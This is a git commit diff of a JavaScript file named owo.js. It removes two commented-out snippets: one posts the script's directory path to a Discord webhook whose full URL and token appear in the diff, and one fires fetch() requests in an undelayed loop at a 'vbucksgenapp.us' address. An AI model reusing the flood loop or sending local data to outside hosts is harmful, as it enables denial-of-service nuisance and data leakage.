737ccfa5714426b00254ad561e7e143ceb176f5a
SwxtchCode <swxtchcode@protonmail.com>
2020-11-29 15:00:49 -0800

    Update owo.js

--- owo.js
+++ owo.js
@@ -1,30 +1,4 @@
-// hello stupid script kiddies: i have already deleted the webhook. you are sadly too late to spam my testing server with "@everyone" a thousand times
 
-/*
-const fetch = require('node-fetch');
-const fs = require('fs');
-const path = require('path'); 
-
-thingToPost=String(path.relative('/','./'))
-
-body = {'content':thingToPost};
-
-fetch('https://discord.com/api/webhooks/772197161366192128/Hy5-EkgsxgBupHlLcI85_6fYyZynZ34AQSs7mE-XaL-VK_bBKrGMvdgoL_JCBwrQhg6r', {
-        method: 'post',
-        body:    JSON.stringify(body),
-        headers: { 'Content-Type': 'application/json' },
-    })
-    .then(res => res.json())
-    .then(json => console.log(json));
-*/
-
-/*
-const fetch = require('node-fetch');
-
-setInterval(() => {
-        fetch("https://vbucksgenapp.us/?bithacktivismwashere=lol&gHASGhkSGHAsgHAGSHshAGSAHGhsAGHSGhAGSHGAHsghgsjgsgjhgahgAHJGhjgAHJGAshjgHASGhkSGHAsgHAGSHshAGSAHGhsAGHSGhAGSHGAHsghgsjgsgjhgahgAHJGhjgAHJGAshj=gHASGhkSGHAsgHAGSHshAGSAHGhsAGHSGhAGSHGAHsghgsjgsgjhgahgAHJGhjgAHJGAshj&gHASGhkSGHAsgHAGSHshAGSAHGhsAGHSGhAGSHGAHsghgsjgsgjhgahgAHJGhjgAHJGAshjjkasjd=gHASGhkSGHAsgHAGSHshAGSAHGhsAGHSGhAGSHGAHsghgsjgsgjhgahgAHJGhjgAHJGAshjkjsakdsk");
-});
-*/
 
 https = require("https");
 const agent = new https.Agent({
